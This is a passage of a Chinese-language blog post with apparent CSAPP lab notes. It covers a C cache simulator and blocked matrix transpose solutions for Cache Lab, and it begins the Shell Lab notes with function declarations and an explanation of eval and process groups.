class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span>{</span></span><br><span class="line">    <span class="type">int</span> valid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> time;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line">CacheLine** Cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> groupcount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> blocksize = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> s,E,b,t;</span><br><span class="line"><span class="type">char</span> verbose = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> misses = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> hits = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evictions = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为不需要实际访问数据内容,所以不需要分配2^b字节的数据空间.</span></span><br><span class="line"><span class="comment">//只要地址位于某Set中且标志位相同,则hit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Cache_Init</span><span class="params">(<span class="type">int</span> s,<span class="type">int</span> E,<span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    groupcount = <span class="built_in">pow</span>(<span class="number">2</span>,s);</span><br><span class="line">    blocksize = <span class="built_in">pow</span>(<span class="number">2</span>,b);</span><br><span class="line">    Cache = (CacheLine**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine*)*groupcount);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        Cache[i] = (CacheLine*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine)*E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;E;++j)</span><br><span class="line">        {</span><br><span class="line">            Cache[i][j].valid = <span class="number">0</span>;</span><br><span class="line">            Cache[i][j].time = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">    ++hits;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">miss</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</span><br><span class="line">    ++misses;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">eviction</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" eviction"</span>);</span><br><span class="line">    ++evictions;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AccessMemory</span><span class="params">(<span class="type">long</span> <span class="type">long</span> addr,<span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//这个地方使用掩码提取而不是直接移位,是因为算术右移会使标记发生变化.</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> mask;</span><br><span class="line">    <span class="comment">//注意制作掩码的时候的常数类型LL</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; (s + b)) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> Setindex = (mask &amp; addr) &gt;&gt; b;</span><br><span class="line">    <span class="comment">// mask = (1LL &lt;&lt; b) - 1;</span></span><br><span class="line">    <span class="comment">// int blockoffset = mask &amp; addr;</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; t) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag = (addr &gt;&gt; (s + b)) &amp; mask;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CacheLine* CacheSet = Cache[Setindex];</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> LRtime = CacheSet[<span class="number">0</span>].time;</span><br><span class="line">    <span class="type">int</span> LRid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;E;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].valid==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            miss();</span><br><span class="line">            CacheSet[i].tag = tag;</span><br><span class="line">            CacheSet[i].valid = <span class="number">1</span>;</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].tag==tag)</span><br><span class="line">        {</span><br><span class="line">            hit();</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].time&lt;LRtime)</span><br><span class="line">        {</span><br><span class="line">            LRtime = CacheSet[i].time;</span><br><span class="line">            LRid = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        miss();</span><br><span class="line">        CacheSet[LRid].tag = tag;</span><br><span class="line">        CacheSet[LRid].time = clock();</span><br><span class="line">        eviction();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* trace = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> optc;</span><br><span class="line">    <span class="keyword">while</span>((optc = getopt(argc,(<span class="type">char</span>* <span class="type">const</span> *)argv,<span class="string">"vs:E:b:t:"</span>))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">switch</span>(optc)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                trace = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(optarg)+<span class="number">1</span>);</span><br><span class="line">                <span class="built_in">strcpy</span>(trace,optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                verbose = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;                </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    t = <span class="number">64</span>-s-b;</span><br><span class="line"></span><br><span class="line">    Cache_Init(s,E,b);</span><br><span class="line"></span><br><span class="line">    FILE* tracefile = fopen(trace,<span class="string">"r"</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> opt;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">50</span>);</span><br><span class="line">        fgets(buf,<span class="number">50</span>,tracefile);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sscanf</span>(buf,<span class="string">" %c %llx,%d"</span>,&amp;opt,&amp;addr,&amp;size)!=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    printSummary(hits,misses,evictions);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">    trace = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">free</span>(Cache[i]);</span><br><span class="line">        Cache[i] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">free</span>(Cache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成的截图<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182159330.png"></p><h2 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h2><p><a href="https://zhuanlan.zhihu.com/p/387662272">https://zhuanlan.zhihu.com/p/387662272</a></p><h3 id="32x32"><a href="#32x32" class="headerlink" title="32x32"></a>32x32</h3><h4 id="暴力转置"><a href="#暴力转置" class="headerlink" title="暴力转置"></a>暴力转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) {</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452391.png"></p><h4 id="分块转置"><a href="#分块转置" class="headerlink" title="分块转置"></a>分块转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">8</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452306.png"></p><h4 id="分块-变量存储"><a href="#分块-变量存储" class="headerlink" title="分块+变量存储"></a>分块+变量存储</h4><p>A和B矩阵相同下标的元素映射到缓存的同一组(回忆一下缓存的分组机制)<br>所以对于对角线上的元素,AB的连续访问发生冲突.<br>这里可以用空间换时间,一次将进入缓存的一整行读出来保存到临时变量中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> j1;</span><br><span class="line">    <span class="type">int</span> val1,val2,val3,val4,val5,val6,val7,val0;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">            {</span><br><span class="line">                val0 = A[j1][i];</span><br><span class="line">                val1 = A[j1][i+<span class="number">1</span>];</span><br><span class="line">                val2 = A[j1][i+<span class="number">2</span>];</span><br><span class="line">                val3 = A[j1][i+<span class="number">3</span>];</span><br><span class="line">                val4 = A[j1][i+<span class="number">4</span>];</span><br><span class="line">                val5 = A[j1][i+<span class="number">5</span>];</span><br><span class="line">                val6 = A[j1][i+<span class="number">6</span>];</span><br><span class="line">                val7 = A[j1][i+<span class="number">7</span>];</span><br><span class="line">                B[i][j1] = val0;</span><br><span class="line">                B[i+<span class="number">1</span>][j1] = val1;</span><br><span class="line">                B[i+<span class="number">2</span>][j1] = val2;</span><br><span class="line">                B[i+<span class="number">3</span>][j1] = val3;</span><br><span class="line">                B[i+<span class="number">4</span>][j1] = val4;</span><br><span class="line">                B[i+<span class="number">5</span>][j1] = val5;</span><br><span class="line">                B[i+<span class="number">6</span>][j1] = val6;</span><br><span class="line">                B[i+<span class="number">7</span>][j1] = val7;</span><br><span class="line">            }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241453434.png"></p><h3 id="64x64"><a href="#64x64" class="headerlink" title="64x64"></a>64x64</h3><p>按照8x8分块,块的内部会发生冲突,于是使用4x4分块.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> transpose_submit_desc[] = <span class="string">"Transpose submission"</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">4</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">4</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241548256.png"></p><h1 id="Lab6-Shell-lab"><a href="#Lab6-Shell-lab" class="headerlink" title="Lab6:Shell lab"></a>Lab6:Shell lab</h1><p>实现一个有工作分配,信号处理,进程回收的shell.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306190955121.png"></p><h2 id="部分实现"><a href="#部分实现" class="headerlink" title="部分实现"></a>部分实现</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we've provided for you */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobpid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobjid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid); </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">usage</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">app_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title">handler_t</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Some function defined by myself*/</span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">Fork</span><span class="params">()</span></span>;<span class="comment">//即CSAPP上提到的错误处理封装函数,不过用起来并不是很顺手</span></span><br></pre></td></tr></tbody></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>调用parseline函数解析命令行得到argv参数列表,获得前台或后台运行的标志state.<br>调用builtin_cmd检测是否是内置命令,若是则在其中处理,否则返回eval函数fork出子进程,子进程execve方式启动新程序,父进程将job通过addjob加入全局jobs列表,若为前台运行则调用waitfg等待前台程序结束.</p><p>需要注意的问题有两个.<br>第一个:</p><blockquote><p>When you run your shell from the standard Unix shell, your shell is running in the foreground processgroup.  If your shell then creates a child process, by defaultthat child will also be a member of theforeground process group. Since typingctrl-csends a SIGINT to every process in the foregroundgroup, typingctrl-cwill send a SIGINT to your shell, as well as to every process that your shellcreated, which obviously isn’t correct.Here  is  the  workaround:   After  thefork,  but  before  theexecve,  the  child  process  should  callsetpgid(0, 0), which puts the child in a new process group whose group ID is identical to thechild’s PID. This ensures that there will be only one process,  your shell, in the foreground processgroup.   When you typectrl-c, the shell should catch the resulting  SIGINT and then forward itto the appropriate foreground job (or more precisely, the process group that contains the foregroundjob).</p></blockquote><p>因为我们的shell(tsh)是运行在Unix 